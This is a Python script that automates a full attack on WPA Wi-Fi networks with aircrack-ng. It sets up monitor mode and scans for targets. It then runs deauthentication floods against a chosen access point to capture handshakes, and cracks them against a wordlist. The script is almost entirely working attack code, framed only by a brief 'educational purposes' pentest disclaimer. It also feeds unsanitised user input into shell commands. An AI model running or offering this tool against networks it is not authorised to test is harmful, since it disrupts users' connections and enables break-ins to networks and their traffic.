import os
from posixpath import join
import time
import os.path
from subprocess import call
from multiprocessing import Process
import threading

interface = []

def start_monitor_mode():
    os.system('clear')
    print("Your network interfaces are...")
    time.sleep(3)
    os.system("airmon-ng")
    time.sleep(.5)
    os.system("airmon-ng check kill")
    time.sleep(.5)
    i = input("Enter your network interface (If The Interface Name Was <wlan0mon> only Enter [wlan0]): ")
    time.sleep(.5)
    interface.append(i)
    os.system("airmon-ng stop " + i + "mon")
    time.sleep(.5)
    command = "airmon-ng start " + i
    os.system(command)
    time.sleep(.5)
    os.system("airmon-ng check kill")
    if not os.path.exists('configs'):
       os.system("mkdir configs")
    record()

def record():
    try:
        os.system("clear")
        i = interface[0]
        print("Which Network Card Do You Selected",'\n',"1 - Internal",'\n',"2 - External")
        op2 = input("Choose [1/2]: ")
        if op2 == "1":
            l = open("configs/mon_int.txt", "w")
            l.write(i + "mon")
            l.close()
            time.sleep(1)
            print("DONE!")
            time.sleep(.5)
            os.system("clear")
            menu()
        elif op2 == "2":
            l = open("configs/mon_int.txt", "w")
            l.write(i)
            l.close()
            time.sleep(1)
            print("DONE!")
            time.sleep(.5)
            os.system("clear")
            menu()
        else:
            print("Please input [1/2].")
            time.sleep(1)
            os.system("clear")
            record()
    except:
        print("Please input [1/2].")
        time.sleep(1)
        os.system("clear")
        record()



def scanning():
    try:
        op = input("Do You Enabled the Monitering Mode On Your Network Card [yes/no]: ")
        if op == "yes":
            l = open("configs/mon_int.txt", "r")
            il = l.read()
            time.sleep(.5)
            os.system(f"airodump-ng {il}")

            b = input("Enter Target BSSID: ")
            print("")
            time.sleep(.5)
            c = input("Enter Channel No of Target: ")
            if not os.path.exists('configs'):
                os.system("mkdir configs")
            bss = open("configs/bssid.txt", "w")
            bss.write(b)
            bss.close()
            chnl = open("configs/channel.txt", "w")
            chnl.write(c)
            chnl.close()
            time.sleep(1)
            print("DONE!")
            time.sleep(.5)
            l.close()
            os.system("clear")
            scan_dump()
        elif op == "no":
            try:            
                op = input("Do You Want To Enable It! [yes/no]: ")
                if op == "yes":
                    os.system("clear")
                    start_monitor_mode()
                elif op == "no":
                    scan_dump()
                else:
                    print("Please input [yes/no].")
                    time.sleep(1)
                    os.system("clear")
                    scanning()
            except:
                print("Please input [yes/no].")
                time.sleep(1)
                os.system("clear")
                scanning()
        else:
            print("Please input [yes/no].")
            time.sleep(1)
            os.system("clear")
            scanning()
    except:
        print("Please input [yes/no].")
        time.sleep(1)
        os.system("clear")
        scanning()    


def de_auth():
    time.sleep(5)
    d = 15
    bss = open("configs/bssid.txt", "r")
    b = bss.read()

    bss.close()
    intr = open("configs/mon_int.txt", "r")
    i = intr.read()

    intr.close()
    os.system(f"gnome-terminal -- sudo aireplay-ng --deauth {d} -a {b} {i}")

def dump():
    b = open("configs/bssid.txt", "r")
    bssid = b.read()
    time.sleep(.5)
    b.close()
    c = open("configs/channel.txt", "r")
    cnl = c.read()
    time.sleep(.5)
    c.close()
    i = open("configs/mon_int.txt", "r")
    intr = i.read()
    time.sleep(.5)
    i.close()
    if os.path.exists('airodump_files'):
        os.system("rm -rf airodump_files/*")
    if not os.path.exists('airodump_files'):
        os.system("mkdir airodump_files")

    os.system(f"airodump-ng --bssid {bssid} -c {cnl} --write airodump_files/WPAcrack {intr}")

def cracking():
    try:
        os.system("clear")
        time.sleep(.5)
        w = input("Enter The Path Of Wordlist File: ")
        os.system(f"aircrack-ng airodump_files/WPAcrack-01.cap -w {w}")
        crack_wifi()
    except:
        print("Enter A Valid Path")
        os.system("clear")
        cracking()


def thread_p():
    op = input("Have U Scanned Network [yes/no]: ")
    try:
        if op == "yes":
            dmp = threading.Thread(target=dump)
            dmp.start()
            dat = threading.Thread(target=de_auth)
            dat.start()
            dmp.join()
            scan_dump()
        elif op == "no":
            os.system("clear")
            time.sleep(.5)
            scan_dump()
        else:
            print("Please input [yes/no].")
            time.sleep(1)
            os.system("clear")
            thread_p()
    except:
        print("Please input [yes/no].")
        time.sleep(1)
        os.system("clear")
        thread_p()

def instal_setup():
    os.system("clear")
    print("Installing everything that is required:")
    time.sleep(2)
    print("Updating...")
    os.system("sudo apt-get update")
    time.sleep(1)
    os.system("clear")
    print("Upgrading...")
    os.system("sudo apt-get upgrade")
    time.sleep(1)
    os.system("clear")
    print("Installing Aircrack-ng...")
    os.system("sudo apt-get install aircrack-ng")
    time.sleep(1)
    print("FINISHED!")
    print("EVERYTHING THAT IS NEEDED IS INSTALLED! HAVE FUN!")
    time.sleep(2)
    os.system("clear")
    menu()
def s_crack():
    try:
        os.system("clear")
        time.sleep(.5)
        p = input("Enter The Path Of Hand Shake FIle: ")
        time.sleep(.5)
        print("")
        w = input("Enter The Path Of Wordlist File: ")
        time.sleep(.5)
        os.system(f"aircrack-ng {p} -w {w}")
        crack_wifi()
    except:
        print("Enter A Valid Path")
        s_crack()

def info_page():
    os.system("clear")
    print("")
    print("\033[31m" + "\033[1m" + "	    WIFI HACKING - AUTOMATING SCRIPT" + "\033[0m")
    print("=========================================================")
    print("|	   " + "\033[1m" + "INFO | INSTRUCTIONS | DISCLAIMERS" + "\033[0m" + "		|")
    print("=========================================================")
    print("\033[1m" + "INFO\n" + "\033[0m")
    print("This tool was developed to automate the process of conducting")
    print("a PenTest on WiFi Networks with Aircrack-ng in Python.\n")
    print("\033[1m" + "INSTRUCTIONS\n" + "\033[0m")
    print("For this tool to work in the best possible way")
    print("please follow these instructions:")
    print("		- Execute Option 2 in the Main Menu.")
    print("		- Try to use the tool functionalities, ")
    print("		    preferably don't clean files manually.\n")
    print("\033[1m" + "DISCLAIMERS\n" + "\033[0m")
    print("-This tool was tested/created in a fully updated Kali Linux")
    print("		Virtual Machine (VMWare).")
    print("-Aircrack-ng need to be installed (Option 1 in Main Menu).")
    print("-WiFi Card used to run in monitor mode was an ALFA AWUS036NHA.")
    print("-This tool uses rockyou.txt wordlist to do cracking by default.")
    print("-This tool is for educational purposes only.")
    print("-This tool was created by" + "\033[33m" + "\033[3m" + " Dutchm3n." + "\033[0m" + "\n")
    menu()

def crack_wifi():
    ##AIRCRACK MENU
    print("")
    print("=========================================================")
    print("|		    " + "\033[1m" + "CRACKING MENU" + "\033[0m" + "			|")
    print("=========================================================")
    print("|   1	|Crack a saved Hanshake FIle                    |")
    print("|   2	|Crack recent captured HandShake file           |")
    print("|   3	|Back to the Main Menu				|")
    print("=========================================================")
    try:
        cw = input("Type your option: ")

        if cw == "1":
            os.system("clear")
            s_crack()
        elif cw == "2":
            cracking()
        elif cw == "3":
            os.system("clear")
            menu()
        else:
            print("Please input a possible option.")
            time.sleep(1)
            os.system("clear")
            crack_wifi()

    except IndexError:
        print("Please input a possible option.")
        time.sleep(1)
        crack_wifi()
        
def scan_dump():
    os.system("clear")
    print("")
    print("=========================================================")
    print("|		      " + "\033[1m" + "CAPTURE MENU" + "\033[0m" + "     			|")
    print("=========================================================")
    print("|   1	|Scan Network                           	|")
    print("|   2	|Capture Hand Shake File            		|")
    print("|   3	|Back to the Main Menu				|")
    print("=========================================================")

    try:
        cw = input("Type your option: ")

        if cw == "1":
            os.system("clear")
            scanning()
        elif cw == "2":
            os.system("clear")
            thread_p()
        elif cw == "3":
            os.system("clear")
            menu()
        else:
            print("Please input a possible option.")
            time.sleep(1)
            scan_dump()

    except:
        print("Please input a possible option.")
        time.sleep(1)
        scan_dump()

def menu():
    print("")
    print("\033[31m" + "\033[1m" + "	    WIFI HACKING - AUTOMATING SCRIPT" + "\033[0m")
    print("\033[94m" + "\033[1m" + "	        ----- AIRCRACK-NG -----" + "\033[0m")
    print("=========================================================")
    print("|	     	      " + "\033[1m" + "MAIN MENU:" + "\033[0m" + "           		|")
    print("=========================================================")
    print("|   0	|Informations, Instructions and Disclaimers	|")
    print("|   1	|Install all that is required			|")
    print("|   2	|Start/Restart interface in Monitor mode	|")
    print("|   3	|Capture Menu               			|")
    print("|   4	|Cracking Menu              			|")
    print("|   99	|Exit 						|")
    print("=========================================================")
    try:
        a = input("Type your option: ")

        if a == "0":
            info_page()
        elif a == "1":
            instal_setup()
        elif a == "2":
            start_monitor_mode()
        elif a == "3":
            scan_dump()
        elif a == "4":
            os.system("clear")
            crack_wifi()
        elif a == "99":
            os._exit(0)
        else:
            print("Please input a possible option.")
            time.sleep(1)
            menu()

    except:
        print("Please input a possible option.")
        time.sleep(1)
        os.system("clear")
        menu()
os.system("clear")
menu()